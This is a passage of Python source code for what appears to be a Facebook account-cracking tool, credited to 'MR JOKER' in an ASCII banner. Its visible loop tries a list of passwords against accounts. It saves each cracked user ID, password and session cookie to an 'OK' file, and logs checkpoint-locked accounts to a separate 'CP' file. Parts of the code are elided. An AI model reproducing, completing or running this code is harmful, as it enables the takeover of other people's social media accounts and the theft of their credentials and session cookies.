...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⢦⣀⣀⣀⣀⣠⡴⠚⠁
--------------------------------------------------
[•]\033[1;32mCREATED BY   : \033[1;32m𝑴𝑹 𝑱𝑶𝑲𝑬𝑹\033[1;32m
[•]\033[1;32mFACEBOOK     : \033[1;32m𝑯𝑨𝑱𝑰 𝑵𝑨𝑱𝑬𝑬𝑩\033[1;32m
[•]\033[1;32mYOUTUBE      : \033[1;32m𝑯𝑨𝑪𝑲𝑬𝑹 𝑱𝑶𝑲𝑬𝑹\033[1;32m
[•]\033[1;32mAUTHOR       : \033[1;32m𝑴𝑹 𝑱𝑶𝑲𝑬𝑹 𝑲𝑯𝑨𝑵𝑶𝑶\033[1;32m
[•]\033[1;32mSTATUS       : \033[1;32mFREE\033[1;32m
--------------------------------------------------
[•] \033[1;32mVERSION    :\033[1;32m 1.0.4 \033[1;32m"𝑳𝑶𝑽𝑬 𝑺𝑯𝑨𝑯𝑰 𝑱𝑶𝑲𝑬𝑹 𝑲𝑯𝑨𝑵𝑶𝑶!"\033[1;32m
--------------------------------------------------"""
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[𝑴𝑹-𝑱𝑶𝑲𝑬𝑹-0K] '+cid+'|'+ps+'\033[0;97m\n[‎‎𝑴𝑹-𝑱𝑶𝑲𝑬𝑹]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('𝑴𝑹-𝑱𝑶𝑲𝑬𝑹-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[𝑴𝑹-𝑱𝑶𝑲𝑬𝑹-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('𝑴𝑹-𝑱𝑶𝑲𝑬𝑹-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97m𝑴𝑹-𝑱𝑶𝑲𝑬𝑹\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
